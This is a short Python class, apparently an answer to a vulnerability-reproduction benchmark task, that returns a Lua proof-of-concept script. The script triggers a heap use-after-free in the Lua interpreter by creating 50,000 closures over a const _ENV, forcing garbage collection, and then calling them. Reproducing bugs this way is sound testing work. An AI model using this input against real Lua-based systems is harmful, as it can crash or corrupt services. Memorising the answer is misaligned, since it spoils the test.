class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""
-- PoC for Heap Use-After-Free in Lua when _ENV is declared as <const>
local function build()
  local _ENV <const> = {}
  return function()
    return _ENV
  end
end

local funcs = {}
for i = 1, 50000 do
  funcs[i] = build()
end

collectgarbage("collect")
collectgarbage("collect")

for i = 1, 50000 do
  funcs[i]()
end
"""
        return poc.lstrip(b"\n")
